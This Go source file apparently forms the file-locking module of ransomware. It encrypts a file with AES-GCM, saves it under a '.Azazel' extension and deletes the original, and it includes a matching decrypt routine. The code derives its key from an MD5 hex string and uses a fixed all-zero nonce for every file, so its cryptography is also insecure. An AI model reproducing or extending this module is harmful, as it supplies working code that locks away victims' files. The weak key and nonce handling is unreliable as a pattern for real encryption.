package encryption

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"io/ioutil"
	"os"
	"strings"
)

type Encryption struct {
	Key      string
	Filename string
}

func makeHashValue(text string) string {
	hasher := md5.New()
	hasher.Write([]byte(text))
	return hex.EncodeToString(hasher.Sum(nil))
}
func NewEncryption(filename string, key string) Encryption {
	enc := Encryption{
		Key:      makeHashValue(key),
		Filename: filename,
	}
	return enc
}
func (enc *Encryption) EncryptFile() error {
	readdata, err1 := ioutil.ReadFile(enc.Filename)
	if err1 != nil {
		return err1
	}
	data := base64.StdEncoding.EncodeToString([]byte(readdata))
	block, err2 := aes.NewCipher([]byte(enc.Key))
	if err2 != nil {
		return err2
	}
	gcm, err3 := cipher.NewGCM(block)
	if err3 != nil {
		return err3
	}
	nonce := make([]byte, gcm.NonceSize())
	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
	ioutil.WriteFile(enc.Filename+".Azazel", ciphertext, 0644)
	err4 := os.Remove(enc.Filename)
	return err4
}
func (enc *Encryption) DecryptFile() error {
	readdata, _ := ioutil.ReadFile(enc.Filename)
	block, err1 := aes.NewCipher([]byte(enc.Key))
	if err1 != nil {
		return err1
	}
	gcm, err2 := cipher.NewGCM(block)
	if err2 != nil {
		return err2
	}
	noncesize := gcm.NonceSize()
	nonce, ciphertext := readdata[:noncesize], readdata[noncesize:]
	plaintext, err3 := gcm.Open(nil, nonce, ciphertext, nil)
	if err3 != nil {
		return err3
	}
	decodedtext, _ := base64.StdEncoding.DecodeString(string(plaintext))
	ioutil.WriteFile(strings.Replace(enc.Filename, ".Azazel", "", -1), decodedtext, 0644)
	os.Remove(enc.Filename)
	return nil
}
